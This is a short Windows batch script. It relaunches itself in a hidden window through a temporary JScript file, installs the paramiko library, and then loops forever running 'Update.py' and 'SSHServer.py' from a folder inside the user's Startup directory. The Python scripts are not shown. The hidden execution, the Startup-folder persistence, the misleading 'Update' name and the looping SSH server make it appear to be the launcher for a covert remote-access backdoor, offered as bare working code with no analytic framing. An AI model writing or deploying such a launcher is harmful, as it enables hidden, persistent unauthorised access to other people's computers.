@echo off
set "WindowName=HiddenRun"  
set self=%~f0
if  not "%~1"=="" goto :mainloop
cd %~dp0

echo var shell = new ActiveXObject('shell.application'); shell.ShellExecute('%self:\=\\%', 'runFlag', '', 'open', 0)>"%temp%\runHidden.js"
cscript /nologo "%temp%\runHidden.js"
del /q "%temp%\runHidden.js"
exit /b


:mainloop
title %WindowName%
pip install paramiko
python "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\cfr\Update.py"
python "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\cfr\SSHServer.py"
goto :mainloop
